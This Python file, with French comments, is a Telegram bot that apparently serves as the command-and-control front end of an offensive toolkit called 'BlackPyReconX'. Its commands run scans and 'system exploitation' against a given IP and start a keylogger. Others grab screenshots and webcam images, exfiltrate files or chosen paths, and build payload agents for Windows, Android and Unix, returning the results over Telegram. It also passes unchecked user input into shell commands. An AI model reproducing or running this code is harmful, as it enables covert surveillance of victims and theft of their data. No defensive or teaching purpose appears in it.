# telegram_bot/telegram_bot.py

import os
from pathlib import Path
from flask import Flask, request
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, ContextTypes
)
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

from modules.utils import get_api_keys

# === 🔐 Clés API
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# === 📁 Répertoires
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"
BUILD_DIR = BASE_DIR / "build" / "dist"

# === 📲 Flask App (Render)
app = Flask(__name__)  # À importer dans main.py

# === 📲 Telegram Application
application: Application = Application.builder().token(TOKEN).build()

# === 🧩 Commandes Telegram

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n"
        "💣 `/set_payload <windows|android|unix>`\n",
        parse_mode=ParseMode.MARKDOWN
    )

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --osint")
    path = OUTPUTS / "osint.txt"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Fichier OSINT introuvable.")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /scan <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --scan")
    path = OUTPUTS / "scan_results.txt"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Résultats de scan introuvables.")

async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exploit_sys <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --exploit_sys")
    await update.message.reply_text("✅ Exploitation système lancée.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --screenshot")
    path = SCREENSHOTS / "screenshot_latest.png"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Aucune capture trouvée.")

async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --keylogger")
    await update.message.reply_text("🎹 Keylogger démarré.")

async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/exploit_sys.py --webcam")
    path = SCREENSHOTS / "webcam_latest.png"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Aucune image webcam trouvée.")

async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --exfil")
    path = OUTPUTS / "exfiltrated.zip"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Aucune archive exfiltrée trouvée.")

async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
    chemin = " ".join(context.args)
    os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
    chemin_escaped = escape_markdown(chemin, version=2)
    await update.message.reply_text(
        f"📂 Exfiltration de `{chemin_escaped}` terminée.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python modules/reporting.py")
    path = OUTPUTS / "rapport_final.txt"
    if path.exists():
        with open(path, "rb") as f:
            await update.message.reply_document(document=f)
    else:
        await update.message.reply_text("❌ Rapport introuvable.")

async def set_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] not in ["windows", "android", "unix"]:
        return await update.message.reply_text("❗ Usage : /set_payload <windows|android|unix>")

    target = context.args[0]
    await update.message.reply_text(f"⚙️ Génération du payload pour `{target}` en cours...")
    os.system(f"python build/packager.py --target {target}")

    payload_name = {
        "windows": "agent_win.exe",
        "android": "agent_android.py",
        "unix": "agent_linux.py"
    }.get(target)

    payload_path = BUILD_DIR / payload_name
    if payload_path.exists():
        with open(payload_path, "rb") as f:
            await update.message.reply_document(document=f)
        await update.message.reply_text(f"✅ Payload `{payload_name}` généré avec succès.")
    else:
        await update.message.reply_text("❌ Échec de la génération du payload.")

# === 🚀 Handlers Telegram
application.add_handler(CommandHandler("menu", menu))
application.add_handler(CommandHandler("osint", osint))
application.add_handler(CommandHandler("scan", scan))
application.add_handler(CommandHandler("exploit_sys", exploit_sys))
application.add_handler(CommandHandler("screenshot", screenshot))
application.add_handler(CommandHandler("keylogger_start", keylogger_start))
application.add_handler(CommandHandler("webcam_snap", webcam_snap))
application.add_handler(CommandHandler("exfiltrate", exfiltrate))
application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
application.add_handler(CommandHandler("rapport", rapport))
application.add_handler(CommandHandler("set_payload", set_payload))

# === 🔁 Webhook HTTP (Render)
@app.post("/telegram/webhook")
async def telegram_webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, application.bot)

    # ✅ Initialisation obligatoire sinon RuntimeError sur Render
    await application.initialize()
    await application.process_update(update)
    return "OK", 200
